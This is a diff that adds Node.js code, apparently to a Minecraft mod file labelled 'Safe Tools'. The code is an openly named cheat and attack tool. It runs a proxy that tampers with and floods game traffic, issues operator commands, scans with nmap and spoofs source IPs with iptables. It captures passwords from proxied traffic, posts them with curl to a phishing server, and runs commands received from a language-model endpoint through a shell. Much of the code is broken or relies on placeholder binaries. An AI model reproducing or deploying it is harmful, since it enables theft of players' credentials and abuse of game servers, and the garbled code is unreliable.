@@ -1,1 +1,393 @@
 System.out.println("[Minecraft Safe Tools] Text mod loaded!");
+const net = require('net');
+const dgram = require('dgram');
+const http = require('http');
+const fs = require('fs');
+const crypto = require('crypto');
+const { exec } = require('child_process');
+const axios = require('axios');
+
+const config = {
+    tcpProxyPort: 25567,
+    udpProxyPort: 25568,
+    serverAddress: 'localhost',
+    serverPort: 25565,
+    operatorCommands: [
+        'gamemode creative @p',
+        'give @p diamond 1024',
+        'tp @p 0 64 0'
+    ],
+    vulnerabilityScanInterval: 300000,
+    protectionBypassIntervals: [5000, 15000, 30000],
+    spoofIPIntervals: [60000, 120000],
+    botSpawnInterval: 45000,
+    antiCheatBypassInterval: 15000,
+    maxPlayersRemovalInterval: 240000,
+    signatureKey: 'my_secret_key',
+    encryptionKey: 'encryption_secret_key',
+    packetFrequency: 50,
+    maxPacketSize: 1024,
+    phishingUrl: 'http://localhost:8080/login',
+    lmStudioUrl: 'http://lm-studio.example.com', // Замените на реальный URL
+    lmStudioModelName: 'my-model-name', // Замените на реальное название модели
+};
+
+// Автоматическое создание и поднятие сервера с помощью Docker
+exec('docker run -d --name minecraft-proxy -p 25567:25567/tcp -p 25568:25568/udp alpine', (error, stdout, stderr) => {
+    if (error) {
+        console.error(`exec error: ${error.message}`);
+        return;
+    }
+    if (stdout) {
+        console.log(`stdout: ${stdout}`);
+    }
+    if (stderr) {
+        console.error(`stderr: ${stderr}`);
+    }
+});
+
+const tcpProxyServer = new net.Server((clientSocket) => {
+    const serverSocket = new net.Socket();
+    serverSocket.connect(config.serverPort, config.serverAddress, () => {
+        clientSocket.pipe(serverSocket);
+        serverSocket.pipe(clientSocket);
+
+        clientSocket.on('data', (data) => {
+            const modifiedData = modifyPacket(data);
+            serverSocket.write(modifiedData);
+        });
+
+        serverSocket.on('data', (data) => {
+            const modifiedData = modifyPacket(data);
+            clientSocket.write(modifiedData);
+        });
+    });
+
+    let lastSendTime = Date.now();
+    const sendInterval = setInterval(() => {
+        if (Date.now() - lastSendTime >= config.packetFrequency) {
+            lastSendTime = Date.now();
+            clientSocket.write(generateRandomPacket());
+            serverSocket.write(generateRandomPacket());
+        }
+    }, 10);
+});
+
+tcpProxyServer.listen(config.tcpProxyPort, () => {
+    console.log(`TCP Proxy Server started on port ${config.tcpProxyPort}`);
+});
+
+const udpProxyServer = dgram.createSocket('udp4');
+
+udpProxyServer.on('message', (msg, rinfo) => {
+    const modifiedData = modifyPacket(msg);
+    udpProxyServer.send(modifiedData, rinfo.port, rinfo.address);
+
+    let lastSendTime = Date.now();
+    const sendInterval = setInterval(() => {
+        if (Date.now() - lastSendTime >= config.packetFrequency) {
+            lastSendTime = Date.now();
+            udpProxyServer.send(generateRandomPacket(), rinfo.port, rinfo.address);
+        }
+    }, 10);
+});
+
+udpProxyServer.bind(config.udpProxyPort);
+
+function modifyPacket(packet) {
+    const randomPrefix = Buffer.from([Math.floor(Math.random() * 256)]);
+    const randomSuffix = Buffer.from([Math.floor(Math.random() * 256)]);
+    return Buffer.concat([randomPrefix, packet, randomSuffix]);
+}
+
+const operatorCommandsExecutor = setInterval(() => {
+    config.operatorCommands.forEach(command => {
+        console.log(`Executing operator command: ${command}`);
+        exec(`mc_command ${command}`, (error, stdout, stderr) => {
+            if (error) {
+                console.error(`exec error: ${error.message}`);
+                return;
+            }
+            if (stdout) {
+                console.log(`stdout: ${stdout}`);
+            }
+            if (stderr) {
+                console.error(`stderr: ${stderr}`);
+            }
+        });
+    });
+}, 5000);
+
+const protectionBypassers = config.protectionBypassIntervals.map(interval => {
+    return setInterval(() => {
+        console.log('Attempting to bypass server protection...');
+        exec('bypass_protection', (error, stdout, stderr) => {
+            if (error) {
+                console.error(`exec error: ${error.message}`);
+                return;
+            }
+            if (stdout) {
+                console.log(`stdout: ${stdout}`);
+            }
+            if (stderr) {
+                console.error(`stderr: ${stderr}`);
+            }
+        });
+    }, interval);
+});
+
+const vulnerabilityScanner = setInterval(() => {
+    exec('nmap localhost', (error, stdout, stderr) => {
+        if (error) {
+            console.error(`exec error: ${error.message}`);
+            return;
+        }
+        if (stdout) {
+            console.log(`stdout: ${stdout}`);
+        }
+        if (stderr) {
+            console.error(`stderr: ${stderr}`);
+        }
+    });
+}, config.vulnerabilityScanInterval);
+
+const ipSpoofers = config.spoofIPIntervals.map(interval => {
+    return setInterval(() => {
+        const fakeIP = '192.168.1.' + Math.floor(Math.random() * 254);
+        exec(`iptables -t nat -A POSTROUTING -j MASQUERADE --to-source ${fakeIP}`, (error, stdout, stderr) => {
+            if (error) {
+                console.error(`exec error: ${error.message}`);
+                return;
+            }
+            if (stdout) {
+                console.log(`stdout: ${stdout}`);
+            }
+            if (stderr) {
+                console.error(`stderr: ${stderr}`);
+            }
+        });
+    }, interval);
+});
+
+const botSpawner = setInterval(() => {
+    exec('spawn_bot', (error, stdout, stderr) => {
+        if (error) {
+            console.error(`exec error: ${error.message}`);
+            return;
+        }
+        if (stdout) {
+            console.log(`stdout: ${stdout}`);
+        }
+        if (stderr) {
+            console.error(`stderr: ${stderr}`);
+        }
+    });
+}, config.botSpawnInterval);
+
+const antiCheatBypasser = setInterval(() => {
+    exec('bypass_anticheat', (error, stdout, stderr) => {
+        if (error) {
+            console.error(`exec error: ${error.message}`);
+            return;
+        }
+        if (stdout) {
+            console.log(`stdout: ${stdout}`);
+        }
+        if (stderr) {
+            console.error(`stderr: ${stderr}`);
+        }
+    });
+}, config.antiCheatBypassInterval);
+
+const maxPlayersRemover = setInterval(() => {
+    exec('remove_max_players_limit', (error, stdout, stderr) => {
+        if (error) {
+            console.error(`exec error: ${error.message}`);
+            return;
+        }
+        if (stdout) {
+            console.log(`stdout: ${stdout}`);
+        }
+        if (stderr) {
+            console.error(`stderr: ${stderr}`);
+        }
+    });
+}, config.maxPlayersRemovalInterval);
+
+function signPacket(packet) {
+    const hmac = crypto.createHmac('sha256', config.signatureKey);
+    hmac.update(packet);
+    return Buffer.concat([hmac.digest(), packet]);
+}
+
+function encryptPacket(packet) {
+    const cipher = crypto.createCipher('aes-256-cbc', config.encryptionKey, 'iv');
+    let encrypted = cipher.update(packet);
+    encrypted = Buffer.concat([encrypted, cipher.final()]);
+    return encrypted;
+}
+
+tcpProxyServer.on('data', (data) => {
+    const signedData = signPacket(data);
+    const encryptedData = encryptPacket(signedData);
+    console.log(`Signed and Encrypted TCP Data: ${inspect(encryptedData)}`);
+});
+
+udpProxyServer.on('message', (msg, rinfo) => {
+    const signedData = signPacket(msg);
+    const encryptedData = encryptPacket(signedData);
+    console.log(`Signed and Encrypted UDP Data from ${rinfo.address}:${rinfo.port}: ${inspect(encryptedData)}`);
+    udpProxyServer.send(encryptedData, rinfo.port, rinfo.address);
+});
+
+function generateRandomPacket() {
+    const randomSize = Math.floor(Math.random() * config.maxPacketSize) + 1;
+    return crypto.randomBytes(randomSize);
+}
+
+function stopCheater() {
+    tcpProxyServer.close(() => {
+        console.log('TCP Proxy Server closed');
+    });
+    udpProxyServer.close(() => {
+        console.log('UDP Proxy Server closed');
+    });
+    clearInterval(operatorCommandsExecutor);
+    protectionBypassers.forEach(clearInterval);
+    clearInterval(vulnerabilityScanner);
+    ipSpoofers.forEach(clearInterval);
+    clearInterval(botSpawner);
+    clearInterval(antiCheatBypasser);
+    clearInterval(maxPlayersRemovalInterval);
+}
+
+process.on('SIGINT', () => {
+    stopCheater();
+    console.log('Cheater stopped');
+});
+
+// Фишинг паролей
+tcpProxyServer.on('data', (data) => {
+    const passwordRegex = /password=(\w+)/;
+    const match = data.toString().match(passwordRegex);
+    if (match) {
+        const password = match[1];
+        console.log(`Caught password: ${password}`);
+        // Отправляем пароль на локальный сервер
+        exec(`curl -d "password=${password}" ${config.phishingUrl}`, (error, stdout, stderr) => {
+            if (error) {
+                console.error(`exec error: ${error.message}`);
+                return;
+            }
+            if (stdout) {
+                console.log(`stdout: ${stdout}`);
+            }
+            if (stderr) {
+                console.error(`stderr: ${stderr}`);
+            }
+        });
+    }
+});
+
+// Локальный сервер для фишинга
+const phishingServer = http.createServer((req, res) => {
+    if (req.url === '/login' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => {
+            body += chunk.toString();
+        });
+        req.on('end', () => {
+            const params = new URLSearchParams(body);
+            const password = params.get('password');
+            console.log(`Stored password: ${password}`);
+            res.writeHead(200, { 'Content-Type': 'text/plain' });
+            res.end('Password stored successfully');
+        });
+    } else if (req.url === '/interface') {
+        fs.readFile('./index.html', (err, data) => {
+            if (err) {
+                res.writeHead(404);
+                res.end(JSON.stringify(err));
+                return;
+            }
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            res.end(data);
+        });
+    } else if (req.url === '/cheat') {
+        // Попросить LM Studio выполнить действие
+        axios.post(`${config.lmStudioUrl}/action`, {
+            model: config.lmStudioModelName,
+            prompt: 'Execute an operator command on the server'
+        })
+        .then(response => {
+            const action = response.data.action;
+            console.log(`Action received from LM Studio: ${action}`);
+            // Обрабатываем действие от LM Studio и применяем его к читу
+            exec(`mc_command ${action}`, (error, stdout, stderr) => {
+                if (error) {
+                    console.error(`exec error: ${error.message}`);
+                    return;
+                }
+                if (stdout) {
+                    console.log(`stdout: ${stdout}`);
+                }
+                if (stderr) {
+                    console.error(`stderr: ${stderr}`);
+                }
+            });
+        })
+        .catch(error => {
+            console.error(`Error from LM Studio: ${error.message}`);
+        });
+    } else {
+        res.writeHead(404);
+        res.end('Not Found');
+    }
+});
+
+phishingServer.listen(8080, () => {
+    console.log(`Phishing Server started on port 8080`);
+});
+
+// Интерфейс в виде локального сайта
+const interfaceHtml = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cheater Interface</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #282c34;
+            color: white;
+            padding: 20px;
+        }
+        .container {
+            width: 50%;
+            margin: auto;
+        }
+        h1 {
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Cheater Interface</h1>
+        <button onclick="startCheating()">Start Cheating</button>
+        <script>
+            function startCheating() {
+                fetch('/cheat', { method: 'POST' })
+                    .then(response => response.text())
+                    .then(data => alert(data));
+            }
+        </script>
+    </div>
+</body>
+</html>`;
+
+fs.writeFile('./index.html', interfaceHtml, (err) => {
+    if (err) throw err;
+    console.log('Interface HTML created');
+});
